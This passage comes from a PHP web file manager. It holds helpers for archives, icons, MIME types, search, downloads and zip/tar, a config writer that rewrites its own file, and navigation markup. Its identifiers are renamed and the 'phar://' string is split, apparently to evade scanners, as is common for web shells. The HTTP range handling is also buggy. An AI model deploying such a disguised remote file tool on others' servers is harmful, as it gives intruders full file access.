    } elseif($ext == 'tar' and class_exists('PharData')) {
        $archive = new PharData($path);
        $filenames = array();
        foreach(new RecursiveIteratorIterator($archive) as $file) {
            $parent_info = $file->getPathInfo();
            $zip_name = str_replace("ph" . "ar://".$path, '', $file->getPathName());
            $zip_name = substr($zip_name, ($pos = strpos($zip_name, '/')) !== false ? $pos + 1 : 0);
            $zip_folder = $parent_info->getFileName();
            $zip_info = new SplFileInfo($file);
            $filenames[] = array(
                'name' => $zip_name,
                'filesize' => $zip_info->getSize(),
                'compressed_size' => $file->getCompressedSize(),
                'folder' => $zip_folder
            );
        }
        return $filenames;
    }
    return false;
}


function fanco($text)
{
    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
}

function fm_isvalid_filename($text) {
    return (strpbrk($text, '/?%*:|"<>') === FALSE) ? true : false;
}


function fm_set_msg($msg, $status = 'ok')
{
    $_SESSION[DN_CESSION_ID]['message'] = $msg;
    $_SESSION[DN_CESSION_ID]['status'] = $status;
}


function fm_is_utf8($string)
{
    return preg_match('//u', $string);
}


function fm_convert_win($filename)
{
    if (FM_IS_WIN and function_exists('iconv')) {
        $filename = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $filename);
    }
    return $filename;
}


function fm_object_to_array($obj)
{
    if (!is_object($obj) and !is_array($obj)) {
        return $obj;
    }
    if (is_object($obj)) {
        $obj = get_object_vars($obj);
    }
    return array_map('fm_object_to_array', $obj);
}


function fm_get_file_icon_class($path)
{
    // get extension
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));

    switch ($ext) {
        case 'ico':
        case 'gif':
        case 'jpg':
        case 'jpeg':
        case 'jpc':
        case 'jp2':
        case 'jpx':
        case 'xbm':
        case 'wbmp':
        case 'png':
        case 'bmp':
        case 'tif':
        case 'tiff':
        case 'webp':
        case 'avif':
        case 'svg':
            $img = 'fa fa-picture-o';
            break;
        case 'passwd':
        case 'ftpquota':
        case 'sql':
        case 'js':
        case 'ts':
        case 'jsx':
        case 'tsx':
        case 'hbs':
        case 'json':
        case 'sh':
        case 'config':
        case 'twig':
        case 'tpl':
        case 'md':
        case 'gitignore':
        case 'c':
        case 'cpp':
        case 'cs':
        case 'py':
        case 'rs':
        case 'map':
        case 'lock':
        case 'dtd':
            $img = 'fa fa-file-code-o';
            break;
        case 'txt':
        case 'ini':
        case 'conf':
        case 'log':
        case 'htaccess':
        case 'yaml':
        case 'yml':
        case 'toml':
        case 'tmp':
        case 'top':
        case 'bot':
        case 'dat':
        case 'bak':
        case 'htpasswd':
        case 'pl':
            $img = 'fa fa-file-text-o';
            break;
        case 'css':
        case 'less':
        case 'sass':
        case 'scss':
            $img = 'fa fa-css3';
            break;
        case 'bz2':
        case 'tbz2':
        case 'tbz':
        case 'zip':
        case 'rar':
        case 'gz':
        case 'tgz':
        case 'tar':
        case '7z':
        case 'xz':
        case 'txz':
        case 'zst':
        case 'tzst':
            $img = 'fa fa-file-archive-o';
            break;
        case 'php':
        case 'php4':
        case 'php5':
        case 'phps':
        case 'phtml':
            $img = 'fa fa-code';
            break;
        case 'htm':
        case 'html':
        case 'shtml':
        case 'xhtml':
            $img = 'fa fa-html5';
            break;
        case 'xml':
        case 'xsl':
            $img = 'fa fa-file-excel-o';
            break;
        case 'wav':
        case 'mp3':
        case 'mp2':
        case 'm4a':
        case 'aac':
        case 'ogg':
        case 'oga':
        case 'wma':
        case 'mka':
        case 'flac':
        case 'ac3':
        case 'tds':
            $img = 'fa fa-music';
            break;
        case 'm3u':
        case 'm3u8':
        case 'pls':
        case 'cue':
        case 'xspf':
            $img = 'fa fa-headphones';
            break;
        case 'avi':
        case 'mpg':
        case 'mpeg':
        case 'mp4':
        case 'm4v':
        case 'flv':
        case 'f4v':
        case 'ogm':
        case 'ogv':
        case 'mov':
        case 'mkv':
        case '3gp':
        case 'asf':
        case 'wmv':
        case 'webm':
            $img = 'fa fa-file-video-o';
            break;
        case 'eml':
        case 'msg':
            $img = 'fa fa-envelope-o';
            break;
        case 'xls':
        case 'xlsx':
        case 'ods':
            $img = 'fa fa-file-excel-o';
            break;
        case 'csv':
            $img = 'fa fa-file-text-o';
            break;
        case 'bak':
        case 'swp':
            $img = 'fa fa-clipboard';
            break;
        case 'doc':
        case 'docx':
        case 'odt':
            $img = 'fa fa-file-word-o';
            break;
        case 'ppt':
        case 'pptx':
            $img = 'fa fa-file-powerpoint-o';
            break;
        case 'ttf':
        case 'ttc':
        case 'otf':
        case 'woff':
        case 'woff2':
        case 'eot':
        case 'fon':
            $img = 'fa fa-font';
            break;
        case 'pdf':
            $img = 'fa fa-file-pdf-o';
            break;
        case 'psd':
        case 'ai':
        case 'eps':
        case 'fla':
        case 'swf':
            $img = 'fa fa-file-image-o';
            break;
        case 'exe':
        case 'msi':
            $img = 'fa fa-file-o';
            break;
        case 'bat':
            $img = 'fa fa-terminal';
            break;
        default:
            $img = 'fa fa-info-circle';
    }

    return $img;
}


function fm_get_image_exts()
{
    return array('ico', 'gif', 'jpg', 'jpeg', 'jpc', 'jp2', 'jpx', 'xbm', 'wbmp', 'png', 'bmp', 'tif', 'tiff', 'psd', 'svg', 'webp', 'avif');
}


function fm_get_video_exts()
{
    return array('avi', 'webm', 'wmv', 'mp4', 'm4v', 'ogm', 'ogv', 'mov', 'mkv');
}


function fm_get_audio_exts()
{
    return array('wav', 'mp3', 'ogg', 'm4a');
}


function fm_get_text_exts()
{
    return array(
        'txt', 'css', 'ini', 'conf', 'log', 'htaccess', 'passwd', 'ftpquota', 'sql', 'js', 'ts', 'jsx', 'tsx', 'mjs', 'json', 'sh', 'config',
        'php', 'php4', 'php5', 'phps', 'phtml', 'htm', 'html', 'shtml', 'xhtml', 'xml', 'xsl', 'm3u', 'm3u8', 'pls', 'cue', 'bash', 'vue',
        'eml', 'msg', 'csv', 'bat', 'twig', 'tpl', 'md', 'gitignore', 'less', 'sass', 'scss', 'c', 'cpp', 'cs', 'py', 'go', 'zsh', 'swift',
        'map', 'lock', 'dtd', 'svg', 'asp', 'aspx', 'asx', 'asmx', 'ashx', 'jsp', 'jspx', 'cgi', 'dockerfile', 'ruby', 'yml', 'yaml', 'toml',
        'vhost', 'scpt', 'applescript', 'csx', 'cshtml', 'c++', 'coffee', 'cfm', 'rb', 'graphql', 'mustache', 'jinja', 'http', 'handlebars',
        'java', 'es', 'es6', 'markdown', 'wiki', 'tmp', 'top', 'bot', 'dat', 'bak', 'htpasswd', 'pl'
    );
}


function fm_get_text_mimes()
{
    return array(
        'application/xml',
        'application/javascript',
        'application/x-javascript',
        'image/svg+xml',
        'message/rfc822',
        'application/json',
    );
}


function fm_get_text_names()
{
    return array(
        'license',
        'readme',
        'authors',
        'contributors',
        'changelog',
    );
}


function fm_get_onlineViewer_exts()
{
    return array('doc', 'docx', 'xls', 'xlsx', 'pdf', 'ppt', 'pptx', 'ai', 'psd', 'dxf', 'xps', 'rar', 'odt', 'ods');
}

function fm_get_file_mimes($extension)
{
    $fileTypes['swf'] = 'application/x-shockwave-flash';
    $fileTypes['pdf'] = 'application/pdf';
    $fileTypes['exe'] = 'application/octet-stream';
    $fileTypes['zip'] = 'application/zip';
    $fileTypes['doc'] = 'application/msword';
    $fileTypes['xls'] = 'application/vnd.ms-excel';
    $fileTypes['ppt'] = 'application/vnd.ms-powerpoint';
    $fileTypes['gif'] = 'image/gif';
    $fileTypes['png'] = 'image/png';
    $fileTypes['jpeg'] = 'image/jpg';
    $fileTypes['jpg'] = 'image/jpg';
    $fileTypes['webp'] = 'image/webp';
    $fileTypes['avif'] = 'image/avif';
    $fileTypes['rar'] = 'application/rar';

    $fileTypes['ra'] = 'audio/x-pn-realaudio';
    $fileTypes['ram'] = 'audio/x-pn-realaudio';
    $fileTypes['ogg'] = 'audio/x-pn-realaudio';

    $fileTypes['wav'] = 'video/x-msvideo';
    $fileTypes['wmv'] = 'video/x-msvideo';
    $fileTypes['avi'] = 'video/x-msvideo';
    $fileTypes['asf'] = 'video/x-msvideo';
    $fileTypes['divx'] = 'video/x-msvideo';

    $fileTypes['mp3'] = 'audio/mpeg';
    $fileTypes['mp4'] = 'audio/mpeg';
    $fileTypes['mpeg'] = 'video/mpeg';
    $fileTypes['mpg'] = 'video/mpeg';
    $fileTypes['mpe'] = 'video/mpeg';
    $fileTypes['mov'] = 'video/quicktime';
    $fileTypes['swf'] = 'video/quicktime';
    $fileTypes['3gp'] = 'video/quicktime';
    $fileTypes['m4a'] = 'video/quicktime';
    $fileTypes['aac'] = 'video/quicktime';
    $fileTypes['m3u'] = 'video/quicktime';

    $fileTypes['php'] = ['application/x-php'];
    $fileTypes['html'] = ['text/html'];
    $fileTypes['txt'] = ['text/plain'];
    //Unknown mime-types should be 'application/octet-stream'
    if(empty($fileTypes[$extension])) {
      $fileTypes[$extension] = ['application/octet-stream'];
    }
    return $fileTypes[$extension];
}


 function scan($dir = '', $filter = '') {
    $path = FM_ROOT_PATH.'/'.$dir;
     if($path) {
         $ite = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
         $rii = new RegexIterator($ite, "/(" . $filter . ")/i");

         $files = array();
         foreach ($rii as $file) {
             if (!$file->isDir()) {
                 $fileName = $file->getFilename();
                 $location = str_replace(FM_ROOT_PATH, '', $file->getPath());
                 $files[] = array(
                     "name" => $fileName,
                     "type" => "file",
                     "path" => $location,
                 );
             }
         }
         return $files;
     }
}


function fm_download_file($fileLocation, $fileName, $chunkSize  = 1024)
{
    if (connection_status() != 0)
        return (false);
    $extension = pathinfo($fileName, PATHINFO_EXTENSION);

    $contentType = fm_get_file_mimes($extension);

    $size = filesize($fileLocation);

    if ($size == 0) {
        fm_set_msg(lng('Zero byte file! Aborting download'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));

        return (false);
    }

    @ini_set('magic_quotes_runtime', 0);
    $fp = fopen("$fileLocation", "rb");

    if ($fp === false) {
        fm_set_msg(lng('Cannot open file! Aborting download'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
        return (false);
    }

    // headers
    header('Content-Description: File Transfer');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header("Content-Transfer-Encoding: binary");
    header("Content-Type: $contentType");

    $contentDisposition = 'attachment';

    if (strstr($_SERVER['HTTP_USER_AGENT'], "MSIE")) {
        $fileName = preg_replace('/\./', '%2e', $fileName, substr_count($fileName, '.') - 1);
        header("Content-Disposition: $contentDisposition;filename=\"$fileName\"");
    } else {
        header("Content-Disposition: $contentDisposition;filename=\"$fileName\"");
    }

    header("Accept-Ranges: bytes");
    $range = 0;

    if (isset($_SERVER['HTTP_RANGE'])) {
        list($a, $range) = explode("=", $_SERVER['HTTP_RANGE']);
        str_replace($range, "-", $range);
        $size2 = $size - 1;
        $new_length = $size - $range;
        header("HTTP/1.1 206 Partial Content");
        header("Content-Length: $new_length");
        header("Content-Range: bytes $range$size2/$size");
    } else {
        $size2 = $size - 1;
        header("Content-Range: bytes 0-$size2/$size");
        header("Content-Length: " . $size);
    }
    $fileLocation = realpath($fileLocation);
    while (ob_get_level()) ob_end_clean();
    readfile($fileLocation);

    fclose($fp);

    return ((connection_status() == 0) and !connection_aborted());
}

function fm_get_theme() {
    $result = '';
    if(FM_THEME == "dark") {
        $result = "text-white bg-dark";
    }
    return $result;
}

class FM_Zipper
{
    private $zip;

    public function __construct()
    {
        $this->zip = new ZipArchive();
    }

    public function create($filename, $files)
    {
        $res = $this->zip->open($filename, ZipArchive::CREATE);
        if ($res !== true) {
            return false;
        }
        if (is_array($files)) {
            foreach ($files as $f) {
                $f = fm_clean_path($f);
                if (!$this->addFileOrDir($f)) {
                    $this->zip->close();
                    return false;
                }
            }
            $this->zip->close();
            return true;
        } else {
            if ($this->addFileOrDir($files)) {
                $this->zip->close();
                return true;
            }
            return false;
        }
    }


    public function unzip($filename, $path)
    {
        $res = $this->zip->open($filename);
        if ($res !== true) {
            return false;
        }
        if ($this->zip->extractTo($path)) {
            $this->zip->close();
            return true;
        }
        return false;
    }


    private function addFileOrDir($filename)
    {
        if (is_file($filename)) {
            return $this->zip->addFile($filename);
        } elseif (is_dir($filename)) {
            return $this->addDir($filename);
        }
        return false;
    }


    private function addDir($path)
    {
        if (!$this->zip->addEmptyDir($path)) {
            return false;
        }
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' and $file != '..') {
                    if (is_dir($path . '/' . $file)) {
                        if (!$this->addDir($path . '/' . $file)) {
                            return false;
                        }
                    } elseif (is_file($path . '/' . $file)) {
                        if (!$this->zip->addFile($path . '/' . $file)) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}


class FM_Zipper_Tar
{
    private $tar;

    public function __construct()
    {
        $this->tar = null;
    }


    public function create($filename, $files)
    {
        $this->tar = new PharData($filename);
        if (is_array($files)) {
            foreach ($files as $f) {
                $f = fm_clean_path($f);
                if (!$this->addFileOrDir($f)) {
                    return false;
                }
            }
            return true;
        } else {
            if ($this->addFileOrDir($files)) {
                return true;
            }
            return false;
        }
    }


    public function unzip($filename, $path)
    {
        $res = $this->tar->open($filename);
        if ($res !== true) {
            return false;
        }
        if ($this->tar->extractTo($path)) {
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($filename)
    {
        if (is_file($filename)) {
            try {
                $this->tar->addFile($filename);
                return true;
            } catch (Exception $e) {
                return false;
            }
        } elseif (is_dir($filename)) {
            return $this->addDir($filename);
        }
        return false;
    }


    private function addDir($path)
    {
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' and $file != '..') {
                    if (is_dir($path . '/' . $file)) {
                        if (!$this->addDir($path . '/' . $file)) {
                            return false;
                        }
                    } elseif (is_file($path . '/' . $file)) {
                        try {
                            $this->tar->addFile($path . '/' . $file);
                        } catch (Exception $e) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}


 class FM_Config
{
     var $data;

    function __construct()
    {
        global $root_path, $root_url, $CONFIG;
        $fm_url = $root_url.$_SERVER["PHP_SELF"];
        $this->data = array(
            'lang' => 'en',
            'error_reporting' => true,
            'show_hidden' => true
        );
        $data = false;
        if (strlen($CONFIG)) {
            $data = fm_object_to_array(json_decode($CONFIG));
        } else {
            $msg = 'gilour<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
                $msg .= '<br>Seems like you have a trailing slash on the URL.';
                $msg .= '<br>Try this link: <a href="' . $fm_url . '">' . $fm_url . '</a>';
            }
            die($msg);
        }
        if (is_array($data) and count($data)) $this->data = $data;
        else $this->save();
    }

    function save()
    {
        $fm_file = __FILE__;
        $var_name = '$CONFIG';
        $var_value = var_export(json_encode($this->data), true);
        $config_string = "<?php" . chr(13) . chr(10) . "//Default Configuration".chr(13) . chr(10)."$var_name = $var_value;" . chr(13) . chr(10);
        if (is_writable($fm_file)) {
            $lines = file($fm_file);
            if ($fh = @fopen($fm_file, "w")) {
                @fputs($fh, $config_string, strlen($config_string));
                for ($x = 3; $x < count($lines); $x++) {
                    @fputs($fh, $lines[$x], strlen($lines[$x]));
                }
                @fclose($fh);
            }
        }
    }
}


function fm_show_nav_path($path)
{
    global $lang, $sticky_navbar, $editFile;
    $isStickyNavBar = $sticky_navbar ? 'fixed-top' : '';
    $getTheme = fm_get_theme();
    $getTheme .= " navbar-light";
    if(FM_THEME == "dark") {
        $getTheme .= " navbar-dark";
    } else {
        $getTheme .= " bg-white";
    }
    ?>
    <nav class="navbar navbar-expand-lg <?php echo $getTheme; ?> mb-4 main-nav <?php echo $isStickyNavBar ?>">
        <a class="navbar-brand"> <?php echo lng('AppTitle') ?> </a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

            <?php
            $path = fm_clean_path($path);
            $root_url = "<a href='?p='><i class='fa fa-home' aria-hidden='true' title='" . FM_ROOT_PATH . "'></i></a>";
            $sep = '<i class="bread-crumb"> / </i>';
            if ($path != '') {
                $exploded = explode('/', $path);
                $count = count($exploded);
                $array = array();
                $parent = '';
                for ($i = 0; $i < $count; $i++) {
                    $parent = trim($parent . '/' . $exploded[$i], '/');
                    $parent_enc = urlencode($parent);
                    $array[] = "<a href='?p={$parent_enc}'>" . fanco(fm_convert_win($exploded[$i])) . "</a>";
                }
                $root_url .= $sep . implode($sep, $array);
            }
            echo '<div class="col-xs-6 col-sm-5">' . $root_url . $editFile . '</div>';
            ?>

            <div class="col-xs-6 col-sm-7">
                <ul class="navbar-nav justify-content-end <?php echo fm_get_theme();  ?>">
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="<?php echo lng('Search') ?>" aria-label="<?php echo lng('Search') ?>" aria-describedby="search-addon2" id="search-addon">
                            <div class="input-group-append">
                                <span class="input-group-text brl-0 brr-0" id="search-addon2"><i class="fa fa-search"></i></span>
                            </div>
                            <div class="input-group-append btn-group">
                                <span class="input-group-text dropdown-toggle brl-0" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
                                  <div class="dropdown-menu dropdown-menu-right">
                                    <a class="dropdown-item" href="<?php echo $path2 = $path ? $path : '.'; ?>" id="js-search-modal" data-bs-toggle="modal" data-bs-target="#searchModal"><?php echo lng('Advanced Search') ?></a>
                                  </div>
                            </div>
                        </div>
                    </li>
                    <?php if (!FM_READONLY): ?>
                    <li class="nav-item">
                        <a title="<?php echo lng('Upload') ?>" class="nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php echo lng('Upload') ?></a>
                    </li>
                    <li class="nav-item">
                        <a title="<?php echo lng('NewItem') ?>" class="nav-link" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php echo lng('NewItem') ?></a>
                    </li>
                    <?php endif; ?>
                    <?php if (FM_USE_AUTH): ?>
                    <li class="nav-item avatar dropdown">
                        <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="fa fa-user-circle"></i> <?php if(isset($_SESSION[DN_CESSION_ID]['logged'])) { echo $_SESSION[DN_CESSION_ID]['logged']; } ?></a>
                        <div class="dropdown-menu text-small shadow <?php echo fm_get_theme(); ?>" aria-labelledby="navbarDropdownMenuLink-5">
                            <?php if (!FM_READONLY): ?>
                            <a title="<?php echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo lng('Settings') ?></a>
                            <?php endif ?>
                            <a title="<?php echo lng('Help') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php echo lng('Help') ?></a>
                            <a title="<?php echo lng('Logout') ?>" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php echo lng('Logout') ?></a>
                        </div>
                    </li>
                    <?php else: ?>
                        <?php if (!FM_READONLY): ?>
                            <li class="nav-item">
                                <a title="<?php echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo lng('Settings') ?></a>
                            </li>
                        <?php endif; ?>
                    <?php endif; ?>
                </ul>
            </div>
        </div>
    </nav>
    <?php
}


function fm_show_message()
{
    if (isset($_SESSION[DN_CESSION_ID]['message'])) {
        $class = isset($_SESSION[DN_CESSION_ID]['status']) ? $_SESSION[DN_CESSION_ID]['status'] : 'ok';
        echo '<p class="message ' . $class . '">' . $_SESSION[DN_CESSION_ID]['message'] . '</p>';
        unset($_SESSION[DN_CESSION_ID]['message']);
        unset($_SESSION[DN_CESSION_ID]['status']);
    }
}


function fm_show_header_login()
{
$sprites_ver = '20160315';
header("Content-Type: text/html; charset=utf-8");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
header("Pragma: no-cache");

global $lang, $root_url, $favicon_path;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="gilour">
    <meta name="author" content="CCP Programmers">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($favicon_path) { echo '<link rel="icon" href="'.fanco($favicon_path).'" type="image/png">'; } ?>
    <title><?php echo fanco(APP_TITLE) ?></title>
    <?php print_external('pre-jsdelivr'); ?>
    <?php print_external('css-bootstrap'); ?>
    <style>
        body.fm-login-page{ background-color:#f7f9fb;font-size:14px;background-color:#f7f9fb;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 304 304' width='304' height='304'%3E%3Cpath fill='%23e2e9f1' fill-opacity='0.4' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 